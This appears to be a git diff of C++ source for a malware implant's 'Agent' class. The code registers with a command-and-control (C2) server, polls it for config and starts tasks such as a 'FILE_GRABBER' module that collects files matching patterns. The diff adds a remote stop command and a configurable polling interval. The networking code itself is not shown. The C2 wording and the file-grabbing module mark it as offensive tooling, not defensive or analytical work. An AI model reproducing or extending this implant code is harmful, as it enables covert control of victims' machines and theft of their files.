@@ -2,28 +2,31 @@
 
 void Agent::start()
 {
-    // ################################################
-    // FOR MODULES DEBUGGING:
-    // uncomment the next lines and change the debug_conf (should be in your ruuning dir)
-    // 
-    // std::string path = "debug_conf.json";
-    // std::ifstream file(path);
-    // if (!file.is_open()) {
-    //     std::cerr << "Could not open the file: " << path << std::endl;
-    //     return;
+    // std::string json_string = R"(
+    // {
+    //     "FILE_GRABBER": 
+    //     {
+    //         "1337": 
+    //         {
+    //         "start_path": "/tmp/aa",
+    //         "files": [".*.jpg", ".*\\.txt$"]
+    //         },
+    //         "1338": 
+    //         {
+    //             "start_path": "/tmp/gg",
+    //             "files": [".*abcd"]
+    //         },
+    //         "restart": "1"
+    //     }
     // }
-    // json config;
-    // try {
-    //     file >> config;
-    // } catch (const json::parse_error& e) {
-    //     std::cerr << "Failed to parse JSON: " << e.what() << std::endl;
-    //     return;
-    // }
+    // )";
+    
+    // json config = json::parse(json_string);
     // start_from_config(config);
-    // sleep(1000000);
-    // ################################################
+    // sleep(60 * 10);
 
     unsigned tries = 0;
+
     while (!agent_register())
     {
         tries += 1;
@@ -31,17 +34,24 @@ void Agent::start()
         {
             throw std::runtime_error("Can't register to C2");
         }
-
+        
         sleep(5);
     }
+    
+    std::cout << "successfully registered to c2" << std::endl;
 
     while (agent_run)
     {
         if(get_server_config())
         {
+            if (config.contains("stop") && config["stop"] == "1")
+            {
+                stop();
+                return;
+            }
             start_from_config(config);
         }
-        sleep(60 * 5);
+        sleep(NEW_CMD_INTERVAL);
     }
 }
 
@@ -51,5 +61,6 @@ void Agent::stop()
     for (const std::unique_ptr<Task> & t : tasks)
     {
         t->stop();
-    }
+    } 
+    agent_run = false;
 }
